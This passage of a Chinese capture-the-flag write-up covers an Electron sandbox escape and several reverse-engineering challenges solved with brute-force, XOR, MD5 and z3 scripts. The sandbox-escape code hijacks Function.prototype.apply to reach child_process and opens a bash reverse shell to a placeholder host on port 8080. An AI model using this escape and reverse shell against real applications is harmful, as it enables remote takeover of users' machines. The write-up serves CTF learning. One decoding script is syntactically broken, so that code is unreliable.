    request.get('http://www.baidu.com/',null)
虽然仅仅是差了一步保存状态，但是自己确实一直以来从未考虑过这个问题，认为只有实战中才要考虑
，CTF就是瞎鸡儿日就ok了。看似一步之差，差的缺很多很多。尤其是看完wp。
比如： **一定要不破坏环境，考虑周全。一定要不破坏环境，考虑周全。一定要不破坏环境，考虑周全。**
最终沙盒逃逸代码如下：
    Function.prototype.apply2=Function.prototype.apply;
    Function.prototype.apply=function(...args){
        if(args[0]!=null && args[0]!=undefined && args[0].env!=undefined){
            Function.prototype.apply=Function.prototype.apply2;
            args[0].mainModule.require('child_process').exec('bash -c "bash -i >& /dev/tcp/XXXXXX/8080 0>&1"');
            }
            return this.apply2(...args)
    }
    request.get('http://www.baidu.com/',null)
## 参考资料
  * [测试 Electron 应用的基本指南](https://xz.aliyun.com/t/2461)
  * [Electron: Abusing the lack of context isolation – CureCon(en)](https://speakerdeck.com/masatokinugawa/electron-abusing-the-lack-of-context-isolation-curecon-en)
## re
###  hardCpp
程序核心的加密与验证部分如下图所示,需要注意关于时间的反调试与干扰变量
观察输出信息：func(?)=”01abfc750a0c942167651c40d088531d”?”。
md5解密后为字符‘#’,说明第一个字符必须是‘#’，然后爆破即可,脚本如下。
    hexData = [0xF3, 0x2E, 0x18, 0x36, 0xE1, 0x4C, 0x22, 0xD1, 0xF9, 0x8C, 0x40, 0x76, 0xF4, 0x0E, 0x00, 0x05,
        0xA3, 0x90, 0x0E, 0xA5 ]
    a=ord('#')
    flag=''
    for i in range(20):
        for j in range(33,127):
            tmp=(((a % 7) + j) % 256) ^ (((3 * (18 ^ a)) + 2) % 256)
            if ( tmp== hexData[i]):
                a=j
                flag+=chr(a)
                break
    print flag
###  Akira HomeWork
首先程序有几处IsDebuggerPresent()的反调试需要注意，而且程序的输入函数是有bug的，运行就会崩溃。所以要绕过该call，手动在内存中输入数据。
第一关：
简单的字符串异或变换
    data=[0x41,0x6A,0x6B,0x71,0x65,0x5A,0x67,0x72,0x7C,0x39,0x55,0x68,0x64,0x3E,0x7D,0x7C,0x4F,0x30,]
    first=''
    for i in range(18):
        first += chr(data[i]^i)
    print first
第二关：
会读取一个文件，这里同样绕过call，手动在内存输入数据。最终加密后会与
    FCAEEB6E34B4303E99B91206BD325F2B
比较，其实就是md5加密，对应明文为“Overwatch”。
第三关：
程序会对内存中的某段数据进行三次解密运算操作
三处解密代码运行在不同时机，作用于同一个内存数据。必须前两关输入的内容正确才能正常触发，其中第二处解密代码不会被执行，导致最终dump出的数据未被完全还原。
并且异或的值也未知，但看出这段数据像PE文件，不难写出解密代码
    for i in range(0x4c00):
        if (i % 3 == 1):
            hexData[i] ^= 0x59
    for i in range(0x4c00):
        print "%02X"%(hexData[i]),
此时得到的数据便是一个DLL文件
该dll会读取共享内存，并进行AES解密运算，密钥为“Ak1i3aS3cre7K3y”。
而共享数据则在原来的exe中
所以AES密文为
    94 BF 7A 0C A4 35 50 D1 C2 15 EC EF 9D 9A AA 56
最后解密即可！
###  babyunic
程序使用unicorn模拟执行二进制文件func
func为mips指令集大端模式，使用jeb-mips反编译效果如下（demo版本只能看，不能复制，气不气？打完比赛之后第一件事就是把jeb破掉。。。）
func调用完成将结果与内存区域的数据进行比较，相等则验证通过
将其翻译成python脚本如下
    #你的输入
    input='your input'
    #正确加密结果
    enFlag=[-108,-200,294,-216,-1008,660,-866,1770,220,6,-244,-522,-1406,-816,386,990,334,690,-1832,372,
    -1370,-1580,450,-1668,858,326,-196,-1516,462,2012,-696,152,2142,-592,-68,878,
    -178,-1994,1472,1710,1684,34]
    #加密运算
    for i in range(len(input)):
        v2=input[i]
        v3=v2>>5 | (v2>3 | (v2<<5)%256
        solution[i]=v3
        flag += chr(solution[i])
    print flag
###  rev
程序需要输入三段数据，中间用特殊字符隔断，其中第一段必须为10位，第二段必须为4位，第三段不超过10位
第一段数据存在异或校验，结合前面的汇编代码可以推出第一段数据为
    11111suctf
以上四处代码不难得出，第二段数据必须是大写字母“ABCDEFG”中的四个，为
    ACEG
第三段数据不能超过十位，必须为数字，且满足上图运算，使用z3约束求解
    from z3 import *
    s = Solver()
    X =  [BitVec(('x%s' % i),32) for i in range(1) ]
    s.add(((1234 * X[0] + 5678) / 4396 ) == 0x6403)
    s.add(((2334 * X[0] + 9875) / 7777) == 0x9be0)
    print s.check()
    m = s.model()
    print "traversing model..."
    for i in range(1):
        print int("%s" % (m[X[i]])),